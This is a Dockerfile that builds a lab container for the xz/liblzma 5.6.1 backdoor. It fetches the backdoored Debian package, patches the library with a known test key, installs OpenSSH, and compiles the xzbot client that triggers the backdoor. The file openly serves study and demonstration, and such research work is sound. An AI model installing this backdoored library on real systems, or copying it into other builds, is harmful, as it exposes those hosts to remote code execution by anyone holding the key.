# Images for each stage.
ARG BUILD_IMAGE=alpine:3.19.1
ARG PATCH_IMAGE=python:3.12.2-slim-bookworm
ARG CLIENT_IMAGE=golang:1.22.1-alpine3.19
ARG FINAL_IMAGE=debian:12.5-slim

# Since xz backdoor only works on x86_64. We hardcoded both OS and ARCH here.
ARG PLATFORM_OS=linux
ARG PLATFORM_ARCH=amd64
ARG PLATFORM=$PLATFORM_OS/$PLATFORM_ARCH
ARG PLATFORM_CPU_ARCH=x86_64

# xz/liblzma version
ARG XZ_VERSION=5.6.1
ARG XZ_SO=liblzma.so
ARG XZ_LIB=$XZ_SO.$XZ_VERSION
ARG XZ_DEB=liblzma5_$XZ_VERSION-1_$PLATFORM_ARCH.deb

#
# BUILD: Clone xzbot repo.
#
FROM $BUILD_IMAGE as build

WORKDIR /build

RUN apk add --no-cache git \
    && git clone https://github.com/amlweems/xzbot.git .

#
# BUILD-PATCH: Patch liblzma with ED448 public key (seed 0).
#
FROM $PATCH_IMAGE as build-patch

ARG PLATFORM_OS
ARG XZ_LIB

WORKDIR /build
COPY --from=build /build/patch.py /build/assets/$XZ_LIB .

RUN ARCH=$(uname -m | tr '_' '-'); \
    apt-get update && apt-get install -y \
    binutils-$ARCH-$PLATFORM_OS-gnu \
    cpp \
    && pip install pwntools \
    && python3 patch.py $XZ_LIB

#
# BUILD-CLIENT: Build xzbot (ssh client).
#
FROM $CLIENT_IMAGE as build-ssh-client

ARG PLATFORM_OS
ARG PLATFORM_ARCH

WORKDIR /build
COPY --from=build /build/go.* /build/main.go .

RUN CGO_ENABLED=0 GOOS=${PLATFORM_OS} GOARCH=${PLATFORM_ARCH} go build

#
# FINAL: Build final image containing patched liblzma and xzbot.
#
FROM $FINAL_IMAGE as final

ARG XZ_LIB
ARG XZ_DEB
ARG PLATFORM_CPU_ARCH
ARG PLATFORM_OS

WORKDIR /build
COPY --from=build-patch /build/$XZ_LIB.patch .
COPY --from=build-ssh-client /build/xzbot .

RUN apt-get update && apt-get install -y \
    wget \
    openssh-server \
    && wget https://snapshot.debian.org/archive/debian/20240328T025657Z/pool/main/x/xz-utils/$XZ_DEB \
    && apt-get install --allow-downgrades --yes ./$XZ_DEB \
    && rm -rf /var/lib/apt/lists/*
    
# Patch liblzma before starting systemd
RUN cp $XZ_LIB.patch /lib/$PLATFORM_CPU_ARCH-$PLATFORM_OS-gnu/$XZ_LIB

CMD ["/lib/systemd/systemd"]
